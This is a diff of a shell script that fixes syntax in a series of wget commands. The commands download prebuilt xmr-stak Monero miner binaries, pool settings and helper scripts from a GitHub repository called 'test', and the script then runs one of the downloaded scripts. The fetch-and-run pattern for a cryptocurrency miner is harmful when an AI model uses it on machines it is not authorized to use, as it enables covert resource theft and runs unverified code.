@@ -8,17 +8,17 @@ mkdir -p scripts
 mkdir -p mine
 
 cd mine
-do wget -O libxmr-stak-asm.a https://raw.githubusercontent.com/pproum/test/master/build/mine/libxmr-stak-asm.a
-do wget -O libxmr-stak-backend.a https://raw.githubusercontent.com/pproum/test/master/build/mine/libxmr-stak-backend.a
-do wget -O libxmr-stak-c.a https://raw.githubusercontent.com/pproum/test/master/build/mine/libxmr-stak-c.a
-do wget -O xmr-stak https://raw.githubusercontent.com/pproum/test/master/build/mine/xmr-stak
-do wget -O config.txt https://raw.githubusercontent.com/pproum/test/master/build/mine/config.txt
-do wget -O pools.txt https://raw.githubusercontent.com/pproum/test/master/build/mine/pools.txt
+wget -O libxmr-stak-asm.a https://raw.githubusercontent.com/pproum/test/master/build/mine/libxmr-stak-asm.a
+wget -O libxmr-stak-backend.a https://raw.githubusercontent.com/pproum/test/master/build/mine/libxmr-stak-backend.a
+wget -O libxmr-stak-c.a https://raw.githubusercontent.com/pproum/test/master/build/mine/libxmr-stak-c.a
+wget -O xmr-stak https://raw.githubusercontent.com/pproum/test/master/build/mine/xmr-stak
+wget -O config.txt https://raw.githubusercontent.com/pproum/test/master/build/mine/config.txt
+wget -O pools.txt https://raw.githubusercontent.com/pproum/test/master/build/mine/pools.txt
 cd ..
 
 cd scripts
-do wget -O create_cpu_config.sh https://raw.githubusercontent.com/pproum/test/master/build/scripts/create_cpu_config.sh
-do wget -O run_xmr_stak.pl https://raw.githubusercontent.com/pproum/test/master/build/scripts/run_xmr_stak.pl
+wget -O create_cpu_config.sh https://raw.githubusercontent.com/pproum/test/master/build/scripts/create_cpu_config.sh
+wget -O run_xmr_stak.pl https://raw.githubusercontent.com/pproum/test/master/build/scripts/run_xmr_stak.pl
 cd ..
 
 scripts/create_cpu_config.sh > mine/cpu.txt 
